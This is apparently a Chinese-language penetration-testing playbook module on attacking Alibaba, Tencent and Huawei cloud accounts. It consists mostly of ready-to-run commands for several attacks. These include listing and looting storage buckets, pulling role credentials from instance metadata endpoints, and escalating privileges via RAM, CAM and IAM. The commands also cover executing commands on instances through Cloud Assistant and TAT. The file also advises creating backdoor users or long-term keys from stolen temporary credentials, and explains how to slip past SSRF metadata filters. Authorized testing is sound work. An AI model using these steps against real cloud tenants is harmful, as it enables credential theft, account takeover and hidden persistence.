# 国内云：OSS / COS / OBS 与元数据差异（进阶）

> 适用：授权评估中资产落在阿里云/腾讯云/华为云（`oss-*.aliyuncs.com`、`cos.*.myqcloud.com`、`obs.*.myhuaweicloud.com`），需要按云差异化打对象存储、元数据、AK/SK 与 RAM/CAM/IAM 的场景。

## 认什么

**三云差异对照（同一动作三套命令，混用必出错）**

| 维度 | 阿里云 | 腾讯云 | 华为云 |
|---|---|---|---|
| 对象存储 URL | `{bucket}.oss-{region}.aliyuncs.com`（内网 `-internal`） | `{bucket}-{appid}.cos.{region}.myqcloud.com` | `{bucket}.obs.{region}.myhuaweicloud.com` |
| 元数据端点 | `100.100.100.200/latest/meta-data/` | `metadata.tencentyun.com/latest/meta-data/`（也支持 `169.254.0.23`） | `169.254.169.254/openstack/latest/`（OpenStack 风格） |
| 凭据前缀 | `LTAI` 长期 / `STS.` 临时 + SecurityToken | `AKID` 开头的 SecretId（36 字符）/ TmpSecretId + Token | AK/SK 约 20 字符、无固定前缀 + `X-Auth-Token`（24h） |
| 身份模型 | RAM 用户/角色/策略 | CAM Uin/SubUin（非 ARN） | IAM 基于 Keystone：Domain/Project/User/Agency |
| 官方 CLI | `aliyun` + `ossutil` | `tccli` + `coscmd`/`coscli`（COS 对象级操作 tccli 做不了） | `openstack` + `obsutil` + REST API 三套 |
| 远程执行/控制台 | Cloud Assistant `RunCommand`；`DescribeInstanceVncUrl` | TAT `RunCommand`；`DescribeInstanceVncUrl` | `openstack console url show`；`server password show` |
| 区域编码 | `cn-hangzhou`、`cn-shanghai`、`cn-beijing` | `ap-guangzhou`、`ap-shanghai`、`ap-beijing` | `cn-north-4`、`cn-east-3`、`cn-south-1` |

**STS 有效期差异决定节奏**：阿里 STS 15 分钟 ~ 12 小时、腾讯 15 分钟 ~ 2 小时、华为 15 分钟 ~ 24 小时。拿到临时凭据先做一次"转移"（建长期 AK 或后门用户），再慢慢枚举；RAM/STS/CAM/IAM 是全局服务，ECS/OBS/COS/RDS 必须逐区域枚举。

**元数据三处差异（决定 SSRF 成败）**：阿里云直连 GET 不需要 Token；腾讯云不强制 IMDSv2 且可用域名形态，只封 `169.254.169.254` 的防护挡不住 `metadata.tencentyun.com`；华为云 IP 与 AWS 相同但路径是 `/openstack/latest/`，只封 `/latest/meta-data/` 的防护挡不住。

## 打哪（命令）

**对象存储（先匿名面，再凭据面）**

```bash
# 阿里云 OSS
curl -s "https://BUCKET.oss-cn-hangzhou.aliyuncs.com/?list-type=2"
aliyun oss ls; aliyun oss ls oss://BUCKET/ -s --all
aliyun oss ls oss://BUCKET/ --include "*.env" --include "*.key" --include "*.pem" --include "*credential*"
# 腾讯云 COS（appid 是桶名后缀，数字）
curl -s "https://BUCKET-1250000000.cos.ap-guangzhou.myqcloud.com/?list-type=2"
coscmd config -a SECRET_ID -s SECRET_KEY -b BUCKET-1250000000 -r ap-guangzhou
coscli ls cos://BUCKET-1250000000/ -r --include "*.env" --include "*.sql" --include "*.bak"
tccli cos GetService            # 只能列桶，对象级要 coscmd/coscli/SDK
# 华为云 OBS
curl -s "https://BUCKET.obs.cn-north-4.myhuaweicloud.com/?max-keys=10"
obsutil config -i AK -k SK -e https://obs.cn-north-4.myhuaweicloud.com -t TOKEN
obsutil ls obs://BUCKET/ -limit=0
obsutil cp obs://BUCKET/config/ /tmp/loot/ -r -f -include="*.env,*.key,*.sql,*.yaml"
```

**元数据（按云取角色与临时凭据）**

```bash
# 阿里云：目录 → RAM 角色名 → 凭据 JSON
curl -s http://100.100.100.200/latest/meta-data/
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/ROLE_NAME
curl -s http://100.100.100.200/latest/user-data
# 腾讯云：cam 段
curl -s http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
curl -s http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/ROLE_NAME
curl -s http://metadata.tencentyun.com/latest/meta-data/placement/region
curl -s http://metadata.tencentyun.com/latest/user-data
# 华为云：meta_data.json 与 securitykey
curl -s http://169.254.169.254/openstack/latest/meta_data.json
curl -s http://169.254.169.254/openstack/latest/securitykey
curl -s http://169.254.169.254/openstack/latest/user_data
```

阿里返回 `AccessKeyId/AccessKeySecret/SecurityToken`；腾讯返回 `TmpSecretId/TmpSecretKey/Token/ExpiredTime`；华为 `securitykey` 返回 `access/secret/securitytoken/expires_at`。三者都直接能配 CLI。

**凭据验证（三套别混）**

```bash
aliyun configure && aliyun sts GetCallerIdentity          # 返回 AccountId/Arn/IdentityType
tccli configure && tccli sts GetCallerIdentity            # 返回 AccountId/Arn/Type（Uin 体系）
export OS_AUTH_URL=https://iam.cn-north-4.myhuaweicloud.com/v3
openstack token issue                                     # Keystone：Token 在 X-Subject-Token
```

**提权（RAM / CAM / IAM 是同一类打法）**

| 云 | 典型提权动作 | 关键权限 |
|---|---|---|
| 阿里 RAM | 给高权限用户建 AK；附加 `AdministratorAccess`；建 Allow * 策略版本并设默认；改角色信任策略；PassRole + 创建 ECS/FC | `ram:CreateAccessKey`、`ram:AttachPolicyToUser`、`ram:CreatePolicyVersion`、`ram:UpdateRole`、`ram:PassRole` + `ecs:CreateInstance`/`fc:CreateFunction` |
| 腾讯 CAM | `CreateAccessKey --TargetUin`；`AttachUserPolicy --PolicyId 1`（预设 AdministratorAccess）；建策略并附加自身；改信任实体；PassRole + CVM/SCF | `cam:CreateAccessKey`、`cam:AttachUserPolicy`、`cam:CreatePolicy`、`cam:UpdateAssumeRolePolicy`、`cam:PassRole` + `cvm:RunInstances`/`scf:CreateFunction` |
| 华为 IAM | REST 为高权限用户建永久 AK/SK；改他人密码；建 Agency 委托；加入高权限组；PassRole + ECS/FunctionGraph | IAM 凭据管理权限、`iam:user:setPassword`、`iam:agency:createAgency`、`iam:group:addUser` |

**控制台与免 SSH 执行（拿到计算面权限后最隐蔽的落地）**

```bash
# 阿里：云助手（先查 Agent，再执行，输出是 Base64）
aliyun ecs DescribeCloudAssistantStatus --InstanceId.1 i-INSTANCE_ID
aliyun ecs RunCommand --Type RunShellScript --CommandContent "id" --InstanceId.1 i-INSTANCE_ID
aliyun ecs DescribeInvocationResults --InvokeId INVOKE_ID
aliyun ecs DescribeInstanceVncUrl --InstanceId i-INSTANCE_ID       # VNC URL 约 15 秒有效
# 腾讯：TAT（Content 为 Base64，CommandType SHELL）
tccli tat DescribeAutomationAgentStatus --InstanceIds '["ins-INSTANCE_ID"]'
tccli tat RunCommand --Content "aWQgJiYgd2hvYW1p" --InstanceIds '["ins-INSTANCE_ID"]' --CommandType SHELL
tccli tat DescribeInvocationTasks --InvocationTaskId TASK_ID
tccli cvm DescribeInstanceVncUrl --InstanceId ins-INSTANCE_ID
# 华为：VNC 与实例密码
openstack console url show SERVER_ID
openstack server password show SERVER_ID          # 加密串，持私钥可解 Windows 管理员密码
```

另外 `DescribeInstanceAttribute`（阿里）/ `DescribeInstances`（腾讯 `CamRoleName` 字段）/ `openstack server show` 都能看出实例是否绑了 RAM/CAM/Agency 角色——绑了就有元数据凭据可取，是横向的关键线索。

## 什么算成

- 对象存储：读到内部对象内容（`.env`、备份、凭据文件）或证明 ACL/桶策略可改，不是只有列桶。
- 元数据：返回角色名与凭据三元组，且该凭据 `GetCallerIdentity`/`token issue` 成功。
- AK/SK：身份确认返回真实 AccountId/Arn，且完成一次数据面或提权动作；RAM/CAM/IAM 提权要有"新凭据能做成原凭据做不成的事"的对照。
- 控制台/远程执行：`RunCommand` 返回真实输出（非 timeout/Agent 未安装），或 VNC 能进到登录界面/实例内。

## 假点

- 解析到云存储域名不等于桶属于目标：OSS/OBS 桶名全局唯一，COS 带 appid 但 appid 也可能属于代运维/子公司主体，需与其他证据关联。
- 桶 403/404 只说明无匿名权限，不能写成"未授权访问"。
- STS 过期后一切 403 不代表没权限，先换新凭据再判。
- `Throttling.User`（阿里）/`RequestLimitExceeded`（腾讯）是限流，不是无权限，降频重试。
- 腾讯 `tccli cos` 不支持对象级操作，误判成"没有 COS 权限"；应换 `coscmd`/`coscli`/SDK。
- 华为云 `/openstack/latest/securitykey` 返回空或 404，可能只是实例没绑 Agency；换 `meta_data.json` 确认实例身份后再判。
- VNC URL 有效期极短（阿里约 15 秒），拿不到就重取，别当成"实例不可控"。

## 与其他包联动

- 六云对比与首枪顺序：`cloud-01-多云资产与攻击面概览.md`
- 元数据 → 长期凭据 → 提权全链：`cloud-05-云凭据-IAM-元数据.md`；AWS 对照：`cloud-02-AWS攻击面与IAM提权.md`
- 对象存储入门（S3 兼容/桶枚举套路）：本包 `对象存储与云元数据实战.md`
- SSRF 打元数据：`../../web-ssrf-render/knowledge/ssrf-internal-network-02-二、云元数据-打内网核心.md`；报告口径：`../../../../rules/40-evidence-report.md`
